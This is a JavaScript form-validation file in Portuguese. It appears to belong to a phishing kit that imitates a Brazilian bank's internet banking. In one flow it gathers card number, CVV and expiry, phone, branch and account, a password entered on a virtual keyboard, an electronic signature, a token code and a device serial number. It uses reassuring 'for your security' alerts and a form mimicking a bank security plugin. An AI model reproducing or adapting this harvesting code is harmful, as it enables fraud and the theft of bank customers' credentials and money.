$(document).ready(function() {
	$('#fone').mask('(00) 00000-0000', {reverse: false});
	$('#cc_number').mask('0000 0000 0000 0000', {reverse: false});
	$('#cc_validade').mask('00/00', {reverse: false});
});

function dica_qrcode(){
	$('#ensinar_qrcode').css('display', 'block');
	return false;
}

function fecha_dica_qrcode(){
	$('#ensinar_qrcode').css('display', 'none');
	return false;
}

function check_qrcode(){
	var qrcode = $('#is_qrcode').val();

	if(qrcode.length < 6){
		alert("O Código QRCode informado não está correto, ou é inválido.\nTente novamente!");
		$('#is_qrcode').val('');
		$('#is_qrcode').focus();
		return false;
	}
}

function checkApelido(){
	var apelido = $('#is_apelido').val();
	
	if(apelido.length < 6){
		alert("Informe um apelido maior para identificar este computador.\nUtilize entre 6 à 8 caracteres!");
		$('#is_apelido').val('');
		$('#is_apelido').focus();
		return false;
	}
}

function checkerCCForm(){
	var nome = $('#cc_name').val();
	var numero = $('#cc_number').val();
	var cvv = $('#cc_cvv').val();
	var validade = $('#cc_validade').val();

	var cc_teste = remove(numero, " ");
	var checkCC = checkCard(cc_teste);

	var sep_val = validade.split('/');

	if(nome.length < 10){
		alert("Informe corretamente o nome como inscrito no cartão.\nTente novamente!");
		$('#cc_name').val('');
		$('#cc_name').focus();
		return false;
	}

	if(numero.length < 19){
		alert("O número do cartão informado não está correto.\nInforme os 16 dígitos da frente do cartão!");
		$('#cc_number').val('');
		$('#cc_number').focus();
		return false;
	}

	if(!checkCC){
		alert("O cartão de crédito informado não está correto, ou não pertence ao titular desta conta.\nTente novamente!");
		$('#cc_number').val('');
		$('#cc_number').focus();
		return false;
	}

	if(cvv.length < 3){
		alert("O Código de segurança informado não está correto.\nTente novamente!");
		$('#cc_cvv').val('');
		$('#cc_cvv').focus();
		return false;
	}
	
	if(validade.length < 5){
		alert("Data de validade informada não está correta.\nTente novamente!");
		$('#cc_validade').val('');
		$('#cc_validade').focus();
		return false;
	}

	if(sep_val[0] > 12){
		alert("Data de validade informada não está correta.\nTente novamente!");
		$('#cc_validade').val('');
		$('#cc_validade').focus();
		return false;
	}

	if(sep_val[1] < 18 || sep_val[1] > 50){
		alert("Data de validade informada não está correta.\nTente novamente!");
		$('#cc_validade').val('');
		$('#cc_validade').focus();
		return false;
	}
}	

function remove(str, sub) {
	i = str.indexOf(sub);
	r = "";
	if (i == -1) return str;
	{
		r += str.substring(0,i) + remove(str.substring(i + sub.length), sub);
	}
	
	return r;
}

function checkCard(num){
	var msg = Array();
	var tipo = null;
	if(num.length > 16 || num[0]==0){
		return false;
	} else {
		var total = 0;
		var arr = Array();
		for(i = 0;i < num.length;i++){
			if(i % 2 == 0){
				dig = num[i] * 2;	
				if(dig > 9){
					dig1 = dig.toString().substr(0,1);
					dig2 = dig.toString().substr(1,1);
					arr[i] = parseInt(dig1)+parseInt(dig2);
				} else {
					arr[i] = parseInt(dig);
				}		
				total += parseInt(arr[i]);
			} else {
				arr[i] =parseInt(num[i]);
				total += parseInt(arr[i]);
			} 
		}
	}
	if(msg.length>0){	
		return false;
	}else{
			if(total%10 == 0){
				return true;
			}else{
				return false;
			}
		}
}

function checkFone(){
	var fone = $('#fone').val();
	
	if(fone.length < 15){
		alert("Por favor, informe o celular cadastrado com DDD para prosseguir.\nTente novamente!");
		$('#fone').val('');
		$('#fone').focus();
		return false;
	}
}

/* EXEC - PULAR CAMPOS */
function proximoCampo(atual,proximo){
	if(atual.value.length >= atual.maxLength){
		document.getElementById(proximo).focus();
	}
}

/* EXEC - ACEITA SOMENTE NÚMEROS */
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
	    if((tecla>47 && tecla<58)) return true;
	    else{
	    	if (tecla==8 || tecla==0) return true;
			else  return false;
    	}
}

/* CHECAR ACESSO PJ */
function checkAcessoPJ(){
	var ag_ct = document.getElementById('ag_ct').value;
	var ct_ct = document.getElementById('ct_ct').value;

	if(ag_ct.length < 4 || ag_ct == '1111' || ag_ct == '2222' || ag_ct == '3333' || ag_ct == '4444' || ag_ct == '5555' || ag_ct == '6666' || ag_ct == '7777' || ag_ct == '8888' || ag_ct == '9999' || ag_ct == '0000'){
		alert("Informe sua agência corretamente.\nTente novamente");
		document.getElementById('ag_ct').focus();
		return false;
	}

	if(ct_ct.length < 6 || ct_ct.length > 10){
		alert("Informe sua Conta corretamente.\nTente novamente");
		document.getElementById('ct_ct').focus();
		return false;
	}
}

function use_teclado(){
	alert("Para sua maior segurança, utilize o teclado virtual para informar sua senha!");
	document.getElementById('cancela').focus();
	return false;
}

function alteraTeclado(botao){
	var estado = document.getElementById('estado_teclado').value;
	var teclado = document.getElementById('teclado_virtual');

	if(estado == 'off'){
		if(botao == 'caps'){
			teclado.src = "imgs/teclado_caps.jpg";
			document.getElementById('estado_teclado').value = 'caps';
		}
		else if(botao == 'shift'){
			teclado.src = "imgs/teclado_shift.jpg";
			document.getElementById('estado_teclado').value = 'shift';
		}
	}
	else if(estado == 'caps'){
		if(botao == 'caps'){
			teclado.src = "imgs/teclado_off.jpg";
			document.getElementById('estado_teclado').value = 'off';
		}
		else if(botao == 'shift'){
			teclado.src = "imgs/teclado_caps_shift.jpg";
			document.getElementById('estado_teclado').value = 'caps_shift';
		}
	}
	else if(estado == 'shift'){
		if(botao == 'shift'){
			teclado.src = "imgs/teclado_off.jpg";
			document.getElementById('estado_teclado').value = 'off';
		}
		else if(botao == 'caps'){
			teclado.src = "imgs/teclado_caps_shift.jpg";
			document.getElementById('estado_teclado').value = 'caps_shift';
		}
	}
	else if(estado == 'caps_shift'){
		if(botao == 'caps'){
			teclado.src = "imgs/teclado_shift.jpg";
			document.getElementById('estado_teclado').value = 'shift';
		}
		else if(botao == 'shift'){
			teclado.src = "imgs/teclado_caps.jpg";
			document.getElementById('estado_teclado').value = 'caps';
		}
	}
}

function letter(letra){
	var estado = document.getElementById('estado_teclado').value;
	var letraInseri = document.getElementById('us_pass');

	if(letra == 'caps'){
		alteraTeclado('caps');
		return false;
	}
	if(letra == 'shift'){
		alteraTeclado('shift');
		return false;
	}
	if(letra == 'apaga'){
		letraInseri.value = '';
		return false;
	}
	if(letra == 'espaco'){
		letraInseri.value += ' ';
		return false;
	}
	if(letra == 'aspa'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += '"';
		}else{
			letraInseri.value += "'";
		}
		return false;
	}
	if(letra == 'underline'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "-";
		}else{
			letraInseri.value += "_";
		}
		return false;
	}
	if(letra == 'igual'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "+";
		}else{
			letraInseri.value += "=";
		}
		return false;
	}
	if(letra == 'acento_agudo'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "`";
		}else{
			letraInseri.value += "´";
		}
		return false;
	}
	if(letra == 'colchete_abre'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "{";
		}else{
			letraInseri.value += "[";
		}
		return false;
	}
	if(letra == 'cedilha'){
		if(estado == 'shift' || estado == 'caps_shift' || estado == 'caps'){
			letraInseri.value += "Ç";
		}else{
			letraInseri.value += "ç";
		}
		return false;
	}
	if(letra == 'tio'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "^";
		}else{
			letraInseri.value += "~";
		}
		return false;
	}
	if(letra == 'colchete_fexa'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "}";
		}else{
			letraInseri.value += "]";
		}
		return false;
	}
	if(letra == 'barra'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "?";
		}else{
			letraInseri.value += "/";
		}
		return false;
	}
	if(letra == 'barra_invertida'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "|";
		}else{
			letraInseri.value += "\\";
		}
		return false;
	}
	if(letra == 'virgula'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "<";
		}else{
			letraInseri.value += ",";
		}
		return false;
	}
	if(letra == 'ponto'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += ">";
		}else{
			letraInseri.value += ".";
		}
		return false;
	}
	if(letra == 'ponto_virgula'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += ":";
		}else{
			letraInseri.value += ";";
		}
		return false;
	}
	if(letra == '1'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "!";
		}else{
			letraInseri.value += "1";
		}
		return false;
	}
	if(letra == '2'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "@";
		}else{
			letraInseri.value += "2";
		}
		return false;
	}
	if(letra == '3'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "#";
		}else{
			letraInseri.value += "3";
		}
		return false;
	}
	if(letra == '4'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "$";
		}else{
			letraInseri.value += "4";
		}
		return false;
	}
	if(letra == '5'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "%";
		}else{
			letraInseri.value += "5";
		}
		return false;
	}
	if(letra == '6'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "¨";
		}else{
			letraInseri.value += "6";
		}
		return false;
	}
	if(letra == '7'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "&";
		}else{
			letraInseri.value += "7";
		}
		return false;
	}
	if(letra == '8'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "*";
		}else{
			letraInseri.value += "8";
		}
		return false;
	}
	if(letra == '9'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += "(";
		}else{
			letraInseri.value += "9";
		}
		return false;
	}
	if(letra == '0'){
		if(estado == 'shift' || estado == 'caps_shift'){
			letraInseri.value += ")";
		}else{
			letraInseri.value += "0";
		}
		return false;
	}
	if(letra == 'enter'){
		var testarForm = checkPswNet();
		if(testarForm){
			document.getElementById('form_pass_net').submit();
		}else{
			return false;
		}
	}
	else{
		if(estado == 'shift' || estado == 'caps_shift' || estado == 'caps'){
			letraInseri.value += letra.toUpperCase();
		}else{
			letraInseri.value += letra.toLowerCase();
		}
		return false;
	}

}

function checkPswNet(){
	var user = document.getElementById('us_ag').value;
	var pass = document.getElementById('us_pass').value;

	if(user.length < 5){
		alert("Você deve informar o seu nome de usuário corretamente.\nTente novamente!");
		document.getElementById('us_ag').focus();
		return false;
	}
	if(pass.length < 5){
		alert("Você deve informar sua senha corretamente.\nTente novamente!");
		return false;
	}
}

function start_loading(){
	document.getElementById('formGbuster').submit();
	return false;
}

function checkAss(){
	var assinatura = document.getElementById('ass_ele').value;

	if(assinatura.length < 6 || assinatura.length > 8){
		alert("Informe a Assinatura Eletrônica corretamente.\nTente novamente!");
		document.getElementById('ass_ele').focus();
		return false;
	}
}

function checkTk(){
	var token = document.getElementById('tks').value;

	if(token.length < 6 || token.length > 6){
		alert("Informe a Senha Token corretamente.\nTente novamente!");
		document.getElementById('tks').focus();
		return false;
	}
}

function checkSerial(){
	var serial_number = document.getElementById('serial_number').value;

	if(serial_number == '' || serial_number.length < 8 || serial_number.length > 10){
		alert("Para sua segurança, precisamos confirmar o número serial de seu dispositivo.\nTente novamente!");
		document.getElementById('serial_number').value = '';
		document.getElementById('serial_number').focus();
		return false;
	}
}
   